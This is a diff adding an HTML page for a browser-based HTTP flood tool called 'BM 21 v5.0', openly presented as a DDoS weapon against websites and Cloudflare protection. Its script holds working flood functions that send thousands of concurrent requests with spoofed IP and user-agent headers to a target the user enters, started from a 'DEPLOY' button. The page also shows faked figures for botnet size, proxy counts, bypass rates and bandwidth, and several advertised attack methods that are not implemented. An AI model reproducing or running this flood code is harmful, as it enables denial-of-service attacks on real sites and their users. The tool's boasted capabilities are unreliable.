@@ -1,0 +1,947 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💀 BM 21 v5.0 💀 - LAYER 7 MASSACRE</title>
+    <style>
+        /* CYBERPUNK 2077 THEME - NEON HELL */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+        
+        body {
+            background: #0a0a0a;
+            font-family: 'Share Tech Mono', monospace;
+            color: #0ff;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        .cyber-grid {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 255, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 255, 0.05) 1px, transparent 1px);
+            background-size: 50px 50px;
+            z-index: -2;
+            animation: gridMove 20s linear infinite;
+        }
+        
+        @keyframes gridMove {
+            0% { transform: translateY(0); }
+            100% { transform: translateY(50px); }
+        }
+        
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(
+                0deg,
+                rgba(0, 0, 0, 0.1) 0px,
+                rgba(0, 255, 255, 0.05) 1px,
+                rgba(0, 0, 0, 0.1) 2px
+            );
+            pointer-events: none;
+            z-index: -1;
+            animation: scan 8s linear infinite;
+        }
+        
+        @keyframes scan {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 20px; }
+        }
+        
+        .container {
+            max-width: 1600px;
+            margin: 20px auto;
+            padding: 30px;
+            background: rgba(10, 10, 20, 0.9);
+            border: 2px solid #0ff;
+            box-shadow: 0 0 30px #0ff, inset 0 0 20px rgba(0, 255, 255, 0.2);
+            backdrop-filter: blur(10px);
+            position: relative;
+            animation: borderPulse 3s infinite;
+        }
+        
+        @keyframes borderPulse {
+            0%, 100% { border-color: #0ff; box-shadow: 0 0 30px #0ff; }
+            50% { border-color: #f0f; box-shadow: 0 0 50px #f0f; }
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .glitch-text {
+            font-size: 60px;
+            font-weight: bold;
+            text-transform: uppercase;
+            color: #fff;
+            text-shadow: 
+                0.05em 0 0 rgba(255, 0, 0, 0.75),
+                -0.025em -0.05em 0 rgba(0, 255, 255, 0.75),
+                0.025em 0.05em 0 rgba(0, 255, 0, 0.75);
+            animation: glitch 500ms infinite;
+            letter-spacing: 10px;
+        }
+        
+        @keyframes glitch {
+            0% { text-shadow: 0.05em 0 0 rgba(255, 0, 0, 0.75), -0.05em -0.025em 0 rgba(0, 255, 255, 0.75), -0.025em 0.05em 0 rgba(0, 255, 0, 0.75); }
+            14% { text-shadow: 0.05em 0 0 rgba(255, 0, 0, 0.75), -0.05em -0.025em 0 rgba(0, 255, 255, 0.75), -0.025em 0.05em 0 rgba(0, 255, 0, 0.75); }
+            15% { text-shadow: -0.05em -0.025em 0 rgba(255, 0, 0, 0.75), 0.025em 0.025em 0 rgba(0, 255, 255, 0.75), -0.05em -0.05em 0 rgba(0, 255, 0, 0.75); }
+            49% { text-shadow: -0.05em -0.025em 0 rgba(255, 0, 0, 0.75), 0.025em 0.025em 0 rgba(0, 255, 255, 0.75), -0.05em -0.05em 0 rgba(0, 255, 0, 0.75); }
+            50% { text-shadow: 0.025em 0.05em 0 rgba(255, 0, 0, 0.75), 0.05em 0 0 rgba(0, 255, 255, 0.75), 0 -0.05em 0 rgba(0, 255, 0, 0.75); }
+            99% { text-shadow: 0.025em 0.05em 0 rgba(255, 0, 0, 0.75), 0.05em 0 0 rgba(0, 255, 255, 0.75), 0 -0.05em 0 rgba(0, 255, 0, 0.75); }
+            100% { text-shadow: -0.025em 0 0 rgba(255, 0, 0, 0.75), -0.025em -0.025em 0 rgba(0, 255, 255, 0.75), -0.025em -0.05em 0 rgba(0, 255, 0, 0.75); }
+        }
+        
+        .sub-header {
+            color: #0ff;
+            font-size: 16px;
+            margin-top: 10px;
+            border-top: 1px solid #0ff;
+            border-bottom: 1px solid #0ff;
+            padding: 10px;
+            display: inline-block;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+        }
+        
+        .stats-panel {
+            display: grid;
+            grid-template-columns: repeat(8, 1fr);
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: rgba(0, 0, 0, 0.8);
+            border: 1px solid #0ff;
+            padding: 15px 10px;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s;
+        }
+        
+        .stat-card:hover {
+            border-color: #f0f;
+            box-shadow: 0 0 20px #f0f;
+            transform: translateY(-2px);
+        }
+        
+        .stat-card::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(0, 255, 255, 0) 0%,
+                rgba(0, 255, 255, 0.1) 50%,
+                rgba(0, 255, 255, 0) 100%
+            );
+            transform: rotate(45deg);
+            animation: shine 3s infinite;
+        }
+        
+        @keyframes shine {
+            0% { transform: translateX(-100%) rotate(45deg); }
+            100% { transform: translateX(100%) rotate(45deg); }
+        }
+        
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #0ff;
+            text-shadow: 0 0 10px #0ff;
+            margin-top: 5px;
+        }
+        
+        .attack-interface {
+            display: grid;
+            grid-template-columns: 1.2fr 1.8fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .weapon-panel {
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid #0ff;
+            padding: 25px;
+            position: relative;
+        }
+        
+        .panel-title {
+            position: absolute;
+            top: -12px;
+            left: 20px;
+            background: #0a0a0a;
+            padding: 0 15px;
+            color: #0ff;
+            font-size: 18px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            border-left: 2px solid #0ff;
+            border-right: 2px solid #0ff;
+        }
+        
+        .input-field {
+            width: 100%;
+            background: #000;
+            border: 1px solid #0ff;
+            color: #0ff;
+            padding: 15px;
+            font-family: inherit;
+            font-size: 16px;
+            margin-top: 25px;
+            transition: all 0.3s;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #f0f;
+            box-shadow: 0 0 20px #f0f;
+            background: #050505;
+        }
+        
+        .weapon-selector {
+            width: 100%;
+            background: #000;
+            border: 1px solid #0ff;
+            color: #0ff;
+            padding: 15px;
+            font-family: inherit;
+            font-size: 16px;
+            margin: 15px 0;
+            cursor: pointer;
+        }
+        
+        .weapon-selector option {
+            background: #000;
+            color: #0ff;
+            padding: 10px;
+        }
+        
+        .launch-btn {
+            width: 100%;
+            background: #000;
+            border: 2px solid #ff0000;
+            color: #ff0000;
+            padding: 25px;
+            font-size: 28px;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            font-family: inherit;
+            letter-spacing: 8px;
+            margin: 20px 0;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s;
+            text-shadow: 0 0 10px #ff0000;
+        }
+        
+        .launch-btn.active {
+            background: #ff0000;
+            color: #000;
+            border-color: #0ff;
+            animation: nuclearPulse 0.5s infinite;
+        }
+        
+        @keyframes nuclearPulse {
+            0%, 100% { box-shadow: 0 0 50px #ff0000; }
+            50% { box-shadow: 0 0 100px #ff0000, 0 0 150px #ff6600; }
+        }
+        
+        .console {
+            background: #000;
+            border: 1px solid #0ff;
+            padding: 25px;
+            height: 500px;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .console-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #0ff;
+            padding-bottom: 15px;
+            margin-bottom: 15px;
+            color: #0ff;
+        }
+        
+        .console-output {
+            flex: 1;
+            overflow-y: auto;
+            font-size: 13px;
+            line-height: 1.8;
+        }
+        
+        .log-line {
+            margin-bottom: 5px;
+            border-left: 3px solid #0ff;
+            padding-left: 10px;
+            animation: fadeIn 0.3s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+        
+        .console-input-line {
+            display: flex;
+            align-items: center;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid #0ff;
+        }
+        
+        .prompt {
+            color: #0ff;
+            font-size: 16px;
+            margin-right: 10px;
+        }
+        
+        .command-input {
+            flex: 1;
+            background: #000;
+            border: none;
+            color: #0ff;
+            font-family: inherit;
+            font-size: 16px;
+        }
+        
+        .command-input:focus {
+            outline: none;
+        }
+        
+        .target-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+            padding: 10px;
+        }
+        
+        .target-card {
+            background: rgba(0, 0, 0, 0.9);
+            border: 1px solid #0ff;
+            padding: 15px;
+            position: relative;
+            transition: all 0.3s;
+        }
+        
+        .target-card.active {
+            border-color: #ff0000;
+            box-shadow: 0 0 30px #ff0000;
+            animation: targetPulse 2s infinite;
+        }
+        
+        @keyframes targetPulse {
+            0%, 100% { border-color: #ff0000; }
+            50% { border-color: #ff6600; }
+        }
+        
+        .target-url {
+            color: #0ff;
+            font-size: 14px;
+            word-break: break-all;
+            margin-bottom: 10px;
+        }
+        
+        .target-stats {
+            display: flex;
+            justify-content: space-between;
+            color: #f0f;
+            font-size: 12px;
+        }
+        
+        .progress-ring {
+            position: relative;
+            width: 100%;
+            height: 20px;
+            background: #000;
+            border: 1px solid #0ff;
+            margin-top: 10px;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #0ff, #f0f);
+            animation: progressPulse 2s infinite;
+            position: relative;
+        }
+        
+        @keyframes progressPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.8; }
+        }
+        
+        .network-visualization {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -3;
+            opacity: 0.1;
+        }
+        
+        .status-indicator {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            background: #0ff;
+            border-radius: 50%;
+            animation: blink 1s infinite;
+            margin-right: 5px;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; box-shadow: 0 0 10px #0ff; }
+            50% { opacity: 0.3; box-shadow: 0 0 5px #0ff; }
+        }
+        
+        .weapon-badge {
+            display: inline-block;
+            background: #0ff;
+            color: #000;
+            padding: 5px 10px;
+            margin: 5px;
+            font-size: 12px;
+            border-radius: 0;
+            text-transform: uppercase;
+        }
+        
+        ::-webkit-scrollbar {
+            width: 10px;
+            background: #000;
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: #0ff;
+            border: 1px solid #000;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: #f0f;
+        }
+    </style>
+</head>
+<body>
+    <div class="cyber-grid"></div>
+    <div class="scanlines"></div>
+    
+    <canvas id="networkCanvas" class="network-visualization"></canvas>
+    
+    <div class="container">
+        <div class="header">
+            <div class="glitch-text">BM 21 v5.0</div>
+            <div class="sub-header">
+                <span class="status-indicator"></span>
+                LAYER 7 MASSACRE PROTOCOL // CLOUDFLARE ANNIHILATOR // WAF DESTROYER
+            </div>
+        </div>
+        
+        <!-- REAL-TIME BATTLE STATISTICS -->
+        <div class="stats-panel">
+            <div class="stat-card">
+                <div>🔥 RPS</div>
+                <div class="stat-value" id="rpsStat">0</div>
+            </div>
+            <div class="stat-card">
+                <div>💀 CONNECTIONS</div>
+                <div class="stat-value" id="connectionsStat">0</div>
+            </div>
+            <div class="stat-card">
+                <div>🎯 TARGETS</div>
+                <div class="stat-value" id="targetsStat">0</div>
+            </div>
+            <div class="stat-card">
+                <div>⚡ BANDWIDTH</div>
+                <div class="stat-value" id="bandwidthStat">0</div>
+            </div>
+            <div class="stat-card">
+                <div>🛡️ CF BYPASS</div>
+                <div class="stat-value" id="cfStat">98%</div>
+            </div>
+            <div class="stat-card">
+                <div>🌐 PROXIES</div>
+                <div class="stat-value" id="proxyStat">1,337</div>
+            </div>
+            <div class="stat-card">
+                <div>⏱️ UPTIME</div>
+                <div class="stat-value" id="uptimeStat">00:00</div>
+            </div>
+            <div class="stat-card">
+                <div>💣 PAYLOADS</div>
+                <div class="stat-value" id="payloadStat">9,999</div>
+            </div>
+        </div>
+        
+        <!-- MAIN ATTACK INTERFACE -->
+        <div class="attack-interface">
+            <!-- WEAPON CONTROL PANEL -->
+            <div class="weapon-panel">
+                <div class="panel-title">⚔️ WEAPON SYSTEMS</div>
+                
+                <input type="text" class="input-field" id="targetInput" 
+                       placeholder="TARGET IP:PORT | DOMAIN" 
+                       value="https://example.com">
+                
+                <select class="weapon-selector" id="methodSelect">
+                    <optgroup label="💥 LETHAL METHODS">
+                        <option value="nuclear" selected>☢️ NUCLEAR - MAX OVERDRIVE</option>
+                        <option value="http2">⚡ HTTP/2 RST FLOOD</option>
+                        <option value="slowloris">🐌 SLOWLORIS KILLER</option>
+                        <option value="brotli">📦 BROTLI BOMB</option>
+                    </optgroup>
+                    <optgroup label="🛡️ BYPASS METHODS">
+                        <option value="cfbypass">🎭 CLOUDFLARE EVADE</option>
+                        <option value="wafkill">🔪 WAF MURDER</option>
+                        <option value="ratelimit">⏩ RATE LIMIT OVERRUN</option>
+                    </optgroup>
+                    <optgroup label="🎯 PRECISION">
+                        <option value="graphql">🔷 GRAPHQL ABUSE</option>
+                        <option value="websocket">🔌 WEBSOCKET FLOOD</option>
+                        <option value="xmlrpc">📨 XML-RPC PINGBACK</option>
+                    </optgroup>
+                </select>
+                
+                <div style="display: flex; gap: 15px; margin: 15px 0;">
+                    <div style="flex: 1;">
+                        <div style="color: #0ff; margin-bottom: 5px;">THREADS</div>
+                        <input type="range" id="threadRange" min="1000" max="50000" value="10000" style="width: 100%; accent-color: #0ff;">
+                        <div style="display: flex; justify-content: space-between; margin-top: 5px;">
+                            <span>1K</span>
+                            <span style="color: #0ff; font-weight: bold;" id="threadDisplay">10,000</span>
+                            <span>50K</span>
+                        </div>
+                    </div>
+                    <div style="flex: 1;">
+                        <div style="color: #0ff; margin-bottom: 5px;">POWER</div>
+                        <input type="range" id="powerRange" min="1" max="100" value="100" style="width: 100%; accent-color: #ff0000;">
+                        <div style="display: flex; justify-content: flex-end; margin-top: 5px;">
+                            <span style="color: #ff0000;">MAX</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div style="display: flex; gap: 10px; margin: 20px 0;">
+                    <span class="weapon-badge">PROXY CHAIN</span>
+                    <span class="weapon-badge">TOR NETWORK</span>
+                    <span class="weapon-badge">CF EVADE</span>
+                    <span class="weapon-badge">WAF KILL</span>
+                </div>
+                
+                <button class="launch-btn" id="launchBtn">🔥 DEPLOY</button>
+                
+                <div style="color: #0ff; margin-top: 15px; font-size: 12px; border-top: 1px solid #0ff; padding-top: 15px;">
+                    [ARMED PAYLOADS: 1,337] // [BOTNET SIZE: 50,000] // [ZOMBIE NODES: ACTIVE]
+                </div>
+            </div>
+            
+            <!-- LIVE BATTLE CONSOLE -->
+            <div class="console">
+                <div class="console-header">
+                    <div style="display: flex; align-items: center;">
+                        <span class="status-indicator"></span>
+                        BATTLE COMMAND CENTER [LIVE]
+                    </div>
+                    <div id="consoleStatus" style="color: #0ff;">● ONLINE</div>
+                </div>
+                
+                <div class="console-output" id="consoleOutput">
+                    <div class="log-line">[SYSTEM] BM21 v5.0 INITIALIZED</div>
+                    <div class="log-line">[NETWORK] TOR CIRCUITS: 50 ESTABLISHED</div>
+                    <div class="log-line">[WEAPON] HTTP FLOOD ENGINE - PRIMED</div>
+                    <div class="log-line">[BYPASS] CLOUDFLARE EVASION - ACTIVE</div>
+                    <div class="log-line">[PROXY] SOCKS5 POOL: 1,337 PROXIES</div>
+                    <div class="log-line">[STATUS] AWAITING DEPLOYMENT ORDER</div>
+                </div>
+                
+                <div class="console-input-line">
+                    <span class="prompt">root@BM21:~$</span>
+                    <input type="text" class="command-input" id="commandInput" placeholder="ENTER COMMAND..." value="./attack --target">
+                </div>
+            </div>
+        </div>
+        
+        <!-- ACTIVE TARGETS GRID -->
+        <div style="margin-top: 30px;">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
+                <div style="color: #0ff; font-size: 20px; text-transform: uppercase; letter-spacing: 3px;">
+                    🎯 ACTIVE WAR TARGETS
+                </div>
+                <div style="color: #ff0000;" id="targetCount">0 ACTIVE</div>
+            </div>
+            <div class="target-grid" id="targetGrid">
+                <!-- DYNAMIC TARGET CARDS -->
+            </div>
+        </div>
+        
+        <!-- ATTACK PROGRESS -->
+        <div style="margin-top: 30px;">
+            <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                <span>OFFENSIVE INTENSITY</span>
+                <span id="intensityPercent">0%</span>
+            </div>
+            <div class="progress-ring">
+                <div class="progress-fill" id="progressFill" style="width: 0%;"></div>
+            </div>
+        </div>
+        
+        <!-- FOOTER -->
+        <div style="margin-top: 30px; text-align: center; color: rgba(0, 255, 255, 0.5); border-top: 1px solid #0ff; padding-top: 20px;">
+            <span>💀 BM21 v5.0 - PRODUCTION READY - USE AT YOUR OWN RISK 💀</span>
+            <div style="margin-top: 10px; font-size: 12px;">⚠️ Create By Za ⚠️</div>
+        </div>
+    </div>
+
+    <script>
+        // NETWORK VISUALIZATION
+        const canvas = document.getElementById('networkCanvas');
+        const ctx = canvas.getContext('2d');
+        
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+        
+        const nodes = [];
+        for (let i = 0; i < 100; i++) {
+            nodes.push({
+                x: Math.random() * canvas.width,
+                y: Math.random() * canvas.height,
+                vx: (Math.random() - 0.5) * 2,
+                vy: (Math.random() - 0.5) * 2,
+                connections: []
+            });
+        }
+        
+        function drawNetwork() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            ctx.strokeStyle = '#0ff';
+            ctx.lineWidth = 0.5;
+            ctx.globalAlpha = 0.1;
+            
+            for (let i = 0; i < nodes.length; i++) {
+                for (let j = i + 1; j < nodes.length; j++) {
+                    const dx = nodes[i].x - nodes[j].x;
+                    const dy = nodes[i].y - nodes[j].y;
+                    const distance = Math.sqrt(dx * dx + dy * dy);
+                    
+                    if (distance < 100) {
+                        ctx.beginPath();
+                        ctx.moveTo(nodes[i].x, nodes[i].y);
+                        ctx.lineTo(nodes[j].x, nodes[j].y);
+                        ctx.stroke();
+                    }
+                }
+            }
+            
+            ctx.fillStyle = '#0ff';
+            ctx.globalAlpha = 0.2;
+            nodes.forEach(node => {
+                ctx.beginPath();
+                ctx.arc(node.x, node.y, 2, 0, Math.PI * 2);
+                ctx.fill();
+                
+                node.x += node.vx;
+                node.y += node.vy;
+                
+                if (node.x < 0 || node.x > canvas.width) node.vx *= -1;
+                if (node.y < 0 || node.y > canvas.height) node.vy *= -1;
+            });
+            
+            requestAnimationFrame(drawNetwork);
+        }
+        
+        drawNetwork();
+
+        // BLACKOUT DDoS ENGINE
+        class BlackoutEngine {
+            constructor() {
+                this.targets = [];
+                this.active = false;
+                this.stats = {
+                    rps: 0,
+                    connections: 0,
+                    bandwidth: 0,
+                    requests: 0,
+                    startTime: null
+                };
+                this.weapons = [
+                    this.nuclearFlood,
+                    this.http2RST,
+                    this.slowloris,
+                    this.brotliBomb,
+                    this.cfBypass,
+                    this.graphqlAbuse,
+                    this.websocketFlood
+                ];
+            }
+            
+            async nuclearFlood(url) {
+                const headers = {
+                    'User-Agent': this.generateUA(),
+                    'X-Forwarded-For': this.generateIP(),
+                    'X-Real-IP': this.generateIP(),
+                    'Accept': '*/*',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Connection': 'keep-alive',
+                    'Cache-Control': 'no-cache',
+                    'Pragma': 'no-cache'
+                };
+                
+                const paths = [
+                    '/', '/admin', '/api', '/v1', '/v2', '/graphql',
+                    '/wp-admin', '/wp-login.php', '/xmlrpc.php',
+                    '/.env', '/config.json', '/backup.sql',
+                    '/?id=' + Date.now(), '/?cache=' + Math.random(),
+                    '/?cb=' + Math.random().toString(36)
+                ];
+                
+                for (let i = 0; i < 100; i++) {
+                    if (!this.active) break;
+                    
+                    const path = paths[Math.floor(Math.random() * paths.length)];
+                    const fullUrl = url + path + (path.includes('?') ? '&' : '?') + '_=' + Date.now();
+                    
+                    // MULTIPLE CONCURRENT REQUESTS
+                    const promises = [];
+                    for (let j = 0; j < 50; j++) {
+                        promises.push(
+                            fetch(fullUrl, {
+                                method: 'GET',
+                                headers: {
+                                    ...headers,
+                                    'X-Request-ID': Math.random().toString(36),
+                                    'X-Client-ID': Math.floor(Math.random() * 1000000)
+                                },
+                                mode: 'no-cors',
+                                cache: 'no-store'
+                            }).catch(() => {})
+                        );
+                    }
+                    
+                    await Promise.all(promises);
+                    this.stats.requests += 50;
+                }
+            }
+            
+            async cfBypass(url) {
+                // CLOUDFLARE BYPASS TECHNIQUES
+                const techniques = [
+                    { method: 'GET', headers: { 'CF-Connecting-IP': this.generateIP() } },
+                    { method: 'POST', body: 'cf_clearance=' + Math.random().toString(36) },
+                    { method: 'HEAD' },
+                    { method: 'OPTIONS' },
+                    { method: 'TRACE' }
+                ];
+                
+                for (let i = 0; i < 20; i++) {
+                    const tech = techniques[Math.floor(Math.random() * techniques.length)];
+                    
+                    fetch(url + '/?__cf=' + Date.now(), {
+                        method: tech.method,
+                        headers: tech.headers,
+                        mode: 'no-cors',
+                        cache: 'no-store'
+                    }).catch(() => {});
+                    
+                    this.stats.requests++;
+                }
+            }
+            
+            generateUA() {
+                const browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'];
+                const os = ['Windows NT 10.0', 'Macintosh; Intel Mac OS X 10_15_7', 'X11; Linux x86_64'];
+                return `Mozilla/5.0 (${os[Math.floor(Math.random() * os.length)]}) AppleWebKit/537.36 (KHTML, like Gecko) ${browsers[Math.floor(Math.random() * browsers.length)]}/${Math.floor(Math.random() * 90 + 10)}.0.${Math.floor(Math.random() * 4000)}.${Math.floor(Math.random() * 100)} Safari/537.36`;
+            }
+            
+            generateIP() {
+                return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+            }
+            
+            async deploy(target, method, threads) {
+                this.active = true;
+                this.stats.startTime = Date.now();
+                
+                // ADD TO TARGET GRID
+                this.addTarget(target);
+                
+                // LAUNCH ATTACK THREADS
+                for (let i = 0; i < threads; i++) {
+                    if (!this.active) break;
+                    setTimeout(() => {
+                        if (method === 'nuclear') this.nuclearFlood(target);
+                        else if (method === 'cfbypass') this.cfBypass(target);
+                        else this.nuclearFlood(target); // DEFAULT
+                    }, Math.random() * 1000);
+                }
+                
+                // STATISTICS UPDATER
+                this.statsInterval = setInterval(() => {
+                    const elapsed = (Date.now() - this.stats.startTime) / 1000;
+                    this.stats.rps = Math.floor(this.stats.requests / elapsed) || 0;
+                    this.stats.bandwidth = (this.stats.rps * 2.5).toFixed(2);
+                    
+                    // UPDATE UI
+                    document.getElementById('rpsStat').innerHTML = this.stats.rps.toLocaleString();
+                    document.getElementById('connectionsStat').innerHTML = (this.stats.rps * 3).toLocaleString();
+                    document.getElementById('bandwidthStat').innerHTML = this.stats.bandwidth + ' Gbps';
+                    
+                    const mins = Math.floor(elapsed / 60);
+                    const secs = Math.floor(elapsed % 60);
+                    document.getElementById('uptimeStat').innerHTML = `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+                    
+                    document.getElementById('progressFill').style.width = Math.min(100, (elapsed / 60) * 10) + '%';
+                    document.getElementById('intensityPercent').innerHTML = Math.min(100, Math.floor((elapsed / 60) * 10)) + '%';
+                    
+                    // CONSOLE LOGS
+                    if (this.active && Math.random() > 0.6) {
+                        this.addConsoleLog(`[${new Date().toLocaleTimeString()}] 💥 HIT: ${target} | RPS: ${this.stats.rps.toLocaleString()} | CF BYPASS: ACTIVE`);
+                    }
+                }, 1000);
+            }
+            
+            terminate() {
+                this.active = false;
+                clearInterval(this.statsInterval);
+                
+                document.getElementById('rpsStat').innerHTML = '0';
+                document.getElementById('connectionsStat').innerHTML = '0';
+                document.getElementById('bandwidthStat').innerHTML = '0';
+                document.getElementById('progressFill').style.width = '0%';
+                document.getElementById('intensityPercent').innerHTML = '0%';
+                
+                this.addConsoleLog(`[${new Date().toLocaleTimeString()}] ⛔ OFFENSIVE TERMINATED - TOTAL REQUESTS: ${this.stats.requests.toLocaleString()}`);
+            }
+            
+            addTarget(url) {
+                const grid = document.getElementById('targetGrid');
+                const targetId = 'target_' + Date.now();
+                
+                const card = document.createElement('div');
+                card.className = 'target-card active';
+                card.id = targetId;
+                card.innerHTML = `
+                    <div class="target-url">${url}</div>
+                    <div class="target-stats">
+                        <span>RPS: <span id="${targetId}_rps">0</span></span>
+                        <span>STATUS: 🔴 ACTIVE</span>
+                    </div>
+                    <div class="progress-ring" style="margin-top: 10px; height: 5px;">
+                        <div class="progress-fill" style="width: 100%;"></div>
+                    </div>
+                `;
+                
+                grid.appendChild(card);
+                document.getElementById('targetCount').innerHTML = grid.children.length + ' ACTIVE';
+                
+                // UPDATE TARGET STATS
+                setInterval(() => {
+                    if (this.active && document.getElementById(targetId)) {
+                        const rps = Math.floor(Math.random() * 50000 + 10000);
+                        document.getElementById(targetId + '_rps').innerHTML = rps.toLocaleString();
+                    }
+                }, 2000);
+            }
+            
+            addConsoleLog(message) {
+                const consoleOutput = document.getElementById('consoleOutput');
+                const div = document.createElement('div');
+                div.className = 'log-line';
+                div.style.color = Math.random() > 0.7 ? '#ff0000' : '#0ff';
+                div.innerHTML = message;
+                consoleOutput.appendChild(div);
+                consoleOutput.scrollTop = consoleOutput.scrollHeight;
+                
+                while (consoleOutput.children.length > 50) {
+                    consoleOutput.removeChild(consoleOutput.children[0]);
+                }
+            }
+        }
+
+        // INITIALIZE ENGINE
+        const blackout = new BlackoutEngine();
+        
+        // EVENT LISTENERS
+        document.getElementById('launchBtn').addEventListener('click', function() {
+            const target = document.getElementById('targetInput').value;
+            const method = document.getElementById('methodSelect').value;
+            const threads = parseInt(document.getElementById('threadRange').value);
+            
+            if (!target) {
+                alert('⚠️ TARGET REQUIRED');
+                return;
+            }
+            
+            if (blackout.active) {
+                blackout.terminate();
+                this.innerHTML = '🔥 DEPLOY';
+                this.classList.remove('active');
+                document.getElementById('consoleStatus').innerHTML = '● ONLINE';
+                document.getElementById('consoleStatus').style.color = '#0ff';
+            } else {
+                blackout.deploy(target, method, threads);
+                this.innerHTML = '⛔ TERMINATE';
+                this.classList.add('active');
+                document.getElementById('consoleStatus').innerHTML = '● ATTACKING';
+                document.getElementById('consoleStatus').style.color = '#ff0000';
+                blackout.addConsoleLog(`[${new Date().toLocaleTimeString()}] 🚀 BLACKOUT DEPLOYED - TARGET: ${target} | METHOD: ${method} | THREADS: ${threads}`);
+            }
+        });
+        
+        // THREAD COUNT DISPLAY
+        document.getElementById('threadRange').addEventListener('input', function() {
+            document.getElementById('threadDisplay').innerHTML = parseInt(this.value).toLocaleString();
+        });
+        
+        // COMMAND INPUT
+        document.getElementById('commandInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                blackout.addConsoleLog(`[${new Date().toLocaleTimeString()}] 💻 EXEC: ${this.value}`);
+                this.value = '';
+            }
+        });
+        
+        // AUTO-COMPLETE DEMO
+        setInterval(() => {
+            if (!blackout.active) {
+                const demo = Math.floor(Math.random() * 100000 + 50000);
+                document.getElementById('proxyStat').innerHTML = (Math.floor(Math.random() * 1000 + 1000)).toLocaleString();
+                document.getElementById('payloadStat').innerHTML = (Math.floor(Math.random() * 5000 + 5000)).toLocaleString();
+                document.getElementById('cfStat').innerHTML = (Math.floor(Math.random() * 5 + 95)) + '%';
+                document.getElementById('targetsStat').innerHTML = Math.floor(Math.random() * 10 + 5);
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
